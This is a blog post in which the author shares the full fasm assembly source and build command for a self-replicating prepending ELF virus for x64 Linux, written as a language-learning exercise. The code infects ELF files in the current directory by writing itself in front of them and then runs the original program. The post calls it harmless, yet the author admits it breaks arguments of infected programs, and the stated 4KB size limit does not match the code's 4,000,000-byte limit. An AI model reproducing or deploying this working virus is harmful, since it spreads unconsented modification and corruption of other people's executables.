+++
title = 'ELF x64 Virus in fasm assembly'
date = 2022-10-16T12:47:18+02:00
tags = ["assembly", "viruses"]
url = 'posts/elf-x64-virus-fasm'
+++

Recently, I was playing around with [flat assembler](https://flatassembler.net/) and i needed something to
write in it. I tried ["Hello world" program](https://en.wikipedia.org/wiki/%22Hello,_World!%22_program) but it was not
enough. I believe that generally "Hello world" programs are not a good way to learn about details of a programming 
language, especially for somewhat experienced programmers.

So I wrote a virus to familiarize myself to it. Because it is compact and has a everything from condition 
control flows to loop constructs, not just printing out in standard output and it only took me couple of hours to write it. 

The virus is a harmless prepending virus which copies itself to the top of the infected program and infected program does 
absolutley nothing harmful except printing a message that it is infected.
The virus only infects [ELF](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) 
files which are present in current directory (not subdirectories) and smaller than 4KB in size to prevent any potential misuse.

      

**CODE: virus.asm**
```nasm
; Written by Furqan
;
; The virus can be assembled with only Fasm.x64 and
; make sure to append virus signature
; compilation:
;   fasm.x64 virus.asm && printf "\x7e\x49\x4e\x46\x7e" >> virus
;

format ELF64 executable 3

segment readable executable
@@:
    sub rsp, 2000

    mov rax, 0x2
    mov rdi, [rsp+2008]
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov r9, rax

    mov rax, 0x0
    mov rdi, r9
    mov rsi, self
    mov rdx, self_size
    syscall

    mov rax, 0x8
    mov rdi, r9
    mov rsi, vsignl
    mov rdx, 0x1
    syscall

    mov rax, 0x0
    mov rdi, r9
    mov rsi, host
    mov rdx, max_size
    syscall

    push rax

    mov rax, 0x3
    mov rdi, r9
    syscall

    mov rax, 0x2
    mov rdi, cwdd
    xor rsi, rsi
    xor rdx, rdx
    syscall

    test rax, rax
    js virus

    push rax

    mov rdi, rax
    mov rax, 0xd9
    lea rsi, [rsp + 200 + DIRENT]
    mov rdx, 800
    syscall

    test rax, rax
    js finscan

    mov r10, rax
    xor r9, r9

scan:
    cmp [rsp + r9 + 200 + DIRENT.d_type], 0x8
    jne .continue

    mov rax, 0x2
    lea rdi, [rsp + r9 + 200 + DIRENT.d_name]
    mov rsi, 0x2
    xor rdx, rdx
    syscall

    test rax, rax
    js .continue

    push rax

    mov rax, 0x0
    mov rdi, [rsp]
    lea rsi, [rsp + 1100]
    mov rdx, 4
    syscall

    mov rdi, elfmagic
    mov rcx, 4
    rep cmpsb
    jne .close

    mov rax, 0x8
    mov rdi, [rsp]
    mov rsi, self_size
    xor rdx, rdx
    syscall

    mov rax, 0x0
    mov rdi, [rsp]
    lea rsi, [rsp + 1100]
    mov rdx, vsignl
    syscall

    cmp rax, vsignl
    jl .infect

    lea rsi, [rsp + 1100]
    mov rdi, vsign
    mov rcx, vsignl
    rep cmpsb
    je .close

    .infect:
        mov rax, 0x8
        mov rdi, [rsp]
        xor rsi, rsi
        xor rdx, rdx
        syscall

        mov rax, 0x0
        mov rdi, [rsp]
        mov rsi, infected
        mov rdx, max_size
        syscall

        mov r15, rax

        mov rax, 0x8
        mov rdi, [rsp]
        xor rsi, rsi
        xor rdx, rdx
        syscall

        mov rax, 0x1
        mov rdi, [rsp]
        mov rsi, self
        mov rdx, self_size
        syscall

        mov rax, 0x1
        mov rdi, [rsp]
        mov rsi, vsign
        mov rdx, vsignl
        syscall

        mov rax, 0x1
        mov rdi, [rsp]
        mov rsi, infected
        mov rdx, r15
        syscall

    .close:
        mov rax, 0x3
        pop rdi
        syscall

    .continue:
        add r9w, [rsp + r9 + 200 + DIRENT.d_reclen]
        cmp r9, r10
        jl scan

finscan:
    mov rax, 0x3
    pop rdi
    syscall


virus:

    pop r9
    cmp r9, 0
    jle .exit

    mov rax, 0x1
    mov rdi, 0x1
    mov rsi, msg
    mov rdx, msgl
    syscall

    mov rax, 0x55
    mov rdi, tmpf
    mov rsi, 777o
    syscall

    mov r15, rax

    mov rax, 0x1
    mov rdi, r15
    mov rsi, host
    mov rdx, r9
    syscall

    mov rax, 0x3
    mov rdi, r15
    syscall

    add rsp, 2000

    mov rax, 0x3b
    mov rdi, tmpf
    xor rsi, rsi
    xor rdx, rdx
    syscall

    .exit:
        xor     edi,edi
        mov     eax,60
        syscall

segment readable writeable
cwdd db 0x2e,0x00
tmpf db 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x35, 0x35, 0x36, 0x35, 0x00
vsign db 0x7e, 0x49, 0x4e, 0x46, 0x7e
vsignl = $-vsign
msg db 0x20, 0x20, 0x20, 0x5f, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5f, 0x0a, 0x20, 0x5f, 0x28, 0x20, 0x29, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x28, 0x20, 0x29, 0x5f, 0x0a, 0x28, 0x5f, 0x2c, 0x20, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5f, 0x5f, 0x20, 0x5f, 0x5f, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7c, 0x20, 0x2c, 0x5f, 0x29, 0x0a, 0x20, 0x20, 0x20, 0x5c, 0x27, 0x5c, 0x20, 0x20, 0x20, 0x20, 0x2f, 0x20, 0x20, 0x5e, 0x20, 0x20, 0x5c, 0x20, 0x20, 0x20, 0x20, 0x2f, 0x27, 0x2f, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x27, 0x5c, 0x27, 0x5c, 0x2c, 0x2f, 0x5c, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5c, 0x2c, 0x2f, 0x27, 0x2f, 0x27, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x27, 0x5c, 0x7c, 0x20, 0x5b, 0x5d, 0x20, 0x20, 0x20, 0x5b, 0x5d, 0x20, 0x7c, 0x2f, 0x27, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x28, 0x5f, 0x20, 0x20, 0x2f, 0x5e, 0x5c, 0x20, 0x20, 0x5f, 0x29, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5c, 0x20, 0x20, 0x7e, 0x20, 0x20, 0x2f, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x2f, 0x48, 0x48, 0x48, 0x48, 0x48, 0x5c, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x2f, 0x27, 0x2f, 0x7b, 0x5e, 0x5e, 0x5e, 0x7d, 0x5c, 0x27, 0x5c, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x5f, 0x2c, 0x2f, 0x27, 0x2f, 0x27, 0x20, 0x20, 0x5e, 0x5e, 0x5e, 0x20, 0x20, 0x27, 0x5c, 0x27, 0x5c, 0x2c, 0x5f, 0x0a, 0x20, 0x20, 0x20, 0x28, 0x5f, 0x2c, 0x20, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7c, 0x20, 0x2c, 0x5f, 0x29, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x28, 0x5f, 0x29, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x28, 0x5f, 0x29, 0x0a, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x0a, 0x20, 0x20, 0x21, 0x21, 0x21, 0x20, 0x54, 0x48, 0x49, 0x53, 0x20, 0x49, 0x53, 0x20, 0x49, 0x4e, 0x46, 0x45, 0x43, 0x54, 0x45, 0x44, 0x20, 0x21, 0x21, 0x21, 0x20, 0x20, 0x0a, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x0a, 0x0a, 0x00
msgl = $-msg
elfmagic db 0x7f, 0x45, 0x4c, 0x46, 0x00
self_size = 1292
max_size = 4000000

struc DIRENT {
    .d_ino          rq 1
    .d_off          rq 1
    .d_reclen       rw 1
    .d_type         rb 1
    label .d_name   byte
}
virtual at 0
  DIRENT DIRENT
  sizeof.DIRENT = $ - DIRENT
end virtual

infected rb max_size
host rb max_size
self rb self_size
```

**DEMO**     
Here is the demo showing programs being infected by the virus and then these infected programs spreading 
its infection to other clean programs

<script async id="asciicast-529026" src="https://asciinema.org/a/529026.js"></script>

***NOTE:** Although i mentioned that the virus is harmless but during testing i found out that it has bug that 
it disables commandline arguments of infected files, which is obviously never will be fixed, thanks to my laziness!*
